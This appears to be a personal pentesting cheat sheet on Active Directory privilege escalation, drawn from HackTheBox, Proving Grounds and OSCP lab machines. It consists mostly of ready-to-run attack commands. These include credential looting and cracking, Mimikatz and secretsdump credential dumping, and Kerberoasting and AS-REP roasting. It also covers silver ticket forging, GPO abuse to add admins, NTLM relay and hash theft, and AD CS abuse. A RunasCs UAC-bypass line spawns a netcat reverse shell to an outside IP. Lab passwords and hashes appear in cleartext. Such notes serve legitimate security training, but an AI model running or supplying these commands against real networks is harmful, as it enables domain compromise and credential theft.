# AD PrivEsc

{% hint style="info" %}
Printer config -> Return \[HTB AD Easy]
{% endhint %}

{% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet" %}

<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure></div>

{% embed url="https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg" %}
Ultimate AD Mindmap
{% endembed %}

## Fundamentals

### DC Full Name

{% hint style="info" %}
Hutch WIndows PG
{% endhint %}

Full name aka DC name would be hostname of computer + domain name ie. `hutchdc.hutch.offsec` \[bloodhound don't work without this]

### Looting

{% hint style="info" %}
Windows PrivEsc Passwords section is also interesting
{% endhint %}

`tree /f /a [folder_name]`

`dir /s/b *.log`&#x20;

`dir /s/b *.txt` (Shows PowerShell history as well)

**Cached Credentials**

**Database Files**

* `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
* `keepass2john Database.kdbx > Keepasshash.txt`
* `john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt`

**PowerShell history**

* `Get-History`
* `(Get-PSReadlineOption).HistorySavePath`
* `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (Run for each user for PS: `$env:USERPROFILE`)

**Interesting Files**

* `cmdkey /list`
* In Users directories `Get-ChildItem -Path C:\Users\ -Include *.txt,*.log,*.xml,*.ini -File -Recurse -ErrorAction SilentlyContinue`
* On Filesystem `Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
* `sysprep.*` `unattend.*`
* `Group Policies` `gpp-decrypt <hash>`
* `.settings,.vnc,.ini`for Remote Desktop Config files with encrypted passwords (VNC, WinSCP)
* PuTTY stores cleartext creds in Registry\
  `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions`

Locally

```
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
```

50 most recent changed files on system can do wonders

`Get-ChildItem -Recurse -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 50 | ForEach-Object { $_.FullName }`

`find / ( -path /proc -o -path /boot -o -path /sys -o -path /run -o -path /var/log -o -path /var/cache ) -prune -o -type f -printf '%T@ %p\n' 2>/dev/null | sort -nr | head -50 | cut -d' ' -f2-`

## Bloodhound

> Ok thank you. Then, you are dealing with **Kerberos Double Hop Issue** (feel free to research on your own what this is when you have the time). Try to get a shell with netcat instead to move away from **Evil-WinRM** and then try to collect the bloodhound data again

```
./SharpHound.exe -c All
.\SharpHound.exe -c ALL --ldapusername yulia.weber --ldappassword "Yulia@Laser777"
bloodhound-python -u '[user]' -p '[password]' -d [domain] -dc [dc] -ns [ip] -c all
[--use-ldaps for LDAP Secure]

Using .ps1
powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

### Handy Tools

#### Faketime

This can matter later if you pivot to:

* Kerberos attacks
* SMB relay
* NTLM auth abuse
* Domain-based auth

```
vboxuser@ubuntu:~/installer$ faketime '2023-09-15 12:52:00 UTC' <normal command>
Friday 15 September 2023 06:22:00 PM IST
```

If the time gap between scanner time and ssl cert is consistent (it's correct cus this was on 4-2-26 test was taken on 26-1-26)

```
vboxuser@ubuntu:~/installer$ faketime -f '-74620041s' date
Sunday 24 September 2023 08:01:21 PM IST
```

**SharpGPOAbuse - Modify Group Policy Objects \[DC Privesc play]**

<div align="left"><figure><img src="../../.gitbook/assets/image (60).png" alt="" width="352"><figcaption><p>clocking via bloodhound</p></figcaption></figure></div>

{% hint style="info" %}
Vault \[PG AD] for manual enumeration whether we have perms and all GPOs available

Always check "Default Domain Policy" first
{% endhint %}

{% embed url="https://gowthamarajr.medium.com/red-teaming-ad-enumeration-gpo-acl-8ad59095bb4e" %}

`Get-GPO` comes from the **GroupPolicy module**, which is included in:

* Windows Server (with Group Policy Management feature installed)
* Windows Pro/Enterprise with **RSAT installed**
* Domain Controllers by default

It is **NOT present** on:

* Windows Home edition
* Machines without RSAT
* Minimal server installations without GPMC feature

<div align="left"><figure><img src="../../.gitbook/assets/image (61).png" alt="" width="375"><figcaption><p>Vault PG AD (We did it again from offsec VM no powerview)</p></figcaption></figure></div>

```
.\powerview.ps1
Get-NetGPO [-GPOname "Default Domain Policy"]

#This PS Default not PoverView
Get-GPO -Name "Default Domain Policy"
Get-GPPermission -Guid [ID] -TargetType User -TargetName [username]
```

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount [user] --GPOName [fake_GPO]
gpupdate /force
```

**RunasCs - If runas not there**

```
.\RunasCs.exe "[user]" '[password]' powershell.exe -r 10.10.14.2:9001
```

Normal runas goes like

```
PS: runas /user:backupadmin cmd
Start-Process "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe" -Verb RunAs
```

Powershell version

{% hint style="info" %}
The latest release has added options like bypass UAC

Invoke-RunasCs -Username adm1 -Password password1 "cmd /c whoami /priv" -BypassUac

Invoke-RunasCs -Username user1 -Password password1 -ProcessTimeout 0 -Command "C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"
{% endhint %}

{% embed url="https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1" %}

#### Hacks (Bypass UAC) - GodPotato certified now

Ok so once you establish the revshell using RunasCs.exe, load the .ps1 version to bypass UAC and run \[Does not work without RunasCs.exe I don't kow why]

{% code overflow="wrap" %}
```
. ./RunasCs.ps1
Invoke-RunasCs -Username jtrip -Password jtrip "cmd /c C:\programdata\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.157 8000" -BypassUac
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption><p>Incase you don't believe me lmao cus psexec be on fraudwatch</p></figcaption></figure>

**gMSADumper - Reads any gMSA password blobs the user can access**

```
python3 gMSADumper.py -u '[user]' -p '[password]' -d [domain]
```

**pyLAPS - Read LAPS if user has the privilege**

```
python3 pyLAPS.py --action get -d "[domain]" -u "[user]" -p '[password]'
```

**NTLMTheft - Creates files that steal NTLM hashes if clicked on/accessed**

```
python ntlm_theft.py -g all -s 10.10.14.9 -f jtripz
```

**pyWhisker - Shadow credential attack**

{% embed url="https://www.hackingarticles.in/shadow-credentials-attack/" %}

## Rubeus

{% hint style="info" %}
defaultapppool user \[SeImpersonate no creds] from Flight \[HTB AD Hard] can perform DCSync using Rubeus
{% endhint %}

{% embed url="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/" %}

```
.\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb
.\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
.\Rubeus.exe klist

.\Rubeus.exe asktgt /user:Administrator /certificate:C:\Programdata\cert.pfx

.\Rubeus.exe tgtdeleg /nowrap [HTB FLight AD]

.\Rubeus.exe kerberoast /outfile:kerberoast
.\Rubeus.exe asreproast
```

With our base64 encoded ticket.kirbi

```
base64 -d ticket.kirbi > ticket.kirbi_b64
python3 ticketConverter.py ticket.kirbi_b64 ticket.ccache
export KRB5CCNAME=./ticket.ccache
```

Confirm by `klist`, what you do next is upto you depending on perms obv - DCSync or psexec?

## Mimikatz

{% embed url="https://pentesting.site/cheat-sheets/mimikatz/" %}

<pre data-title="Works with evil-winrm as well"><code><strong>.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
</strong>.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit

"lsadump::secrets"
"lsadump::cache"

SAM and SECRETS dump SYSTEM and SAM stuff, LOGONPASSWORDS and CACHE are another unit yfm
There's quite a few more like credman and stuff please check incase you're stuck
</code></pre>

{% embed url="https://woshub.com/how-to-get-plain-text-passwords-of-windows-users/" %}

**Memory dump of lsass incase of Credential Guard**

{% embed url="https://www.reddit.com/r/oscp/comments/10vgzpj/help_with_mimikatz_error_error_kuhl_m_sekurlsa/" %}
Faced this issue in the first attempt, diff version number ours is 2.20
{% endembed %}

{% embed url="https://github.com/ebalo55/mimikatz" %}
&#x20;Incase 2.1 also isn't working we have 2.0 here, also maybe interactive shell produces better results?
{% endembed %}

## Kerberos

```
./kerbrute_linux_amd64 passwordspray -d FRIZZ.HTB ~/htb/rooms/frizz/output.txt '!suBcig@MehTed!R' --dc 'FRIZZDC.FRIZZ.HTB'
./kerbrute_linux_amd64 userenum -d egotistical-bank.local  ~/htb/sauna/newuser.txt --dc egotistical-bank.local -v | grep 'VALID' 
```

### Silver Ticket (Service Accounts)

If you can authenticate without kerberos no need for this (unless some functionalities are restricted eg. command execution)

A **Silver Ticket attack** forges a Kerberos **service ticket (TGS)** for a specific service (like MSSQL, CIFS, HTTP, etc.) without contacting the Domain Controller.

Unlike a Golden Ticket (which uses the KRBTGT hash), a Silver Ticket requires:

* The **NTLM hash (or AES key)** of the _service account_ running the service
* The **domain SID**
* The **SPN** of the target service
* The domain name

Now you can impersonate whoever you want without needing to contact KDC

{% hint style="info" %}
Nagoya \[PG AD]
{% endhint %}

```
Get-Addomain
S-1-5-21-1969309164-1513403977-1686805993

SPN password hash (NT for Service1)
E3A0168BC21CFB88B95C954A5B18F57C

Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
MSSQL/nagoya.nagoya-industries.com

impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
export KRB5CCNAME=Administrator.ccache

mssqlclient.py -k nagoya.nagoya-industries.com
```

For auth using kerberos ticket

```
[libdefaults]
        default_realm = NAGOYA-INDUSTRIES.COM
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
        fcc-mit-ticketflags = true

[realms]

        NAGOYA-INDUSTRIES.COM = {
                kdc=nagoya.nagoya-industries.com
        }

[domain_realm]
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM

```

#### GetNPUsers - ASREP Roasting for users with no pre-auth

{% code title="18200" %}
```
python3 GetNPUsers.py [domain]/ -dc-ip [ip] -usersfile userlist.txt
./GetNPUsers.py -no-pass -dc-ip [ip] -request '[domain]/[user]'
```
{% endcode %}

#### GetUserSPN - find Service Principal Names and hash of associated user account

{% code title="13100" %}
```
python3 GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] 
python3 GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] -request <get ticket here>
```
{% endcode %}

#### DNSTool \[krbrelayx] - Edit  ADIDNS (AD Integrated DNS)

Regular users create child objects by default, attackers can leverage that and hijack traffic - no need to be DNS Admin for this

```
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.2 --type A 10.10.10.248
```

### Impacket

#### SecretsDump - Dump admin hashes if DCSync privileges enabled

```
sudo python3 secretsdump.py [domain]/[user]@[ip]
sudo python3 secretsdump.py -k -no-pass [host_domain] -just-dc-user [user] #Using KRB5CCNAME
```

{% embed url="https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b" %}
offbrand mimikatz bro so much more than just dcsync - sam and lsa sorted, cached logon info too sorted it seems
{% endembed %}

#### getTGT - request a TGT and save it as ccache

```
python3 getTGT.py -dc-ip [ip] [domain]/'[user]':'[password]'
```

#### getST - request a Service Ticket and save it as ccache

```
python3 getST.py -spn [SPN] [-impersonate administrator] -hashes [hash] -dc-ip [ip] [domain]/[user]
```

#### NTLMRelayx

Redirect NTLM creds to another system.

The challenge issued by server is always a unique string of characters, here we initiate connection with our target, pass that challenge to the victim and required NTLM hash is generated accordingly. NTLM hashes are not fixed, they change everytime with every request hence holding onto one to pass isn't the best idea

{% hint style="info" %}
Zeus PEN-200 Challenge Labs

Due to SMB signing being disabled on the system, a relay attack is possible if we can force an authentication.
{% endhint %}

{% code overflow="wrap" %}
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.209.159 -c 'powershell -e [base64_shell]' -debug
```
{% endcode %}

#### PSexec - Semi shell that writes to $ADMIN share

You got a ticket for Admin? THis the place to be

```
export KRB5CCNAME=ticket.ccache; python3 psexec.py [domain]/[user]@[dc_domain] -k -no-pass
python3 psexec.py -hashes [hash] [user]@[ip] cmd.exe 
python3 psexec.py zeus.corp/o.foller:EarlyMorningFootball777@192.168.209.160 cmd.exe
```

{% embed url="https://medium.com/@allypetitt/windows-remoting-difference-between-psexec-wmiexec-atexec-exec-bf7d1edb5986" %}

#### TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files and vice-versa

```
base64 -d ticket.kirbi.b64 > ticket.kirbi
./ticketConverter.py ticket.kirbi ticket.ccache
```

### AD CS (Certificate Service)

```
certipy-ad find -dc-ip [ip] -ns [ip] -u [user]@[domain] -p '[password]' -vulnerable -stdout
nxc ldap "domain_controller" -d "domain" -u "user" -p "password" -M adcs
.\Certify.exe find /vulnerable
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```
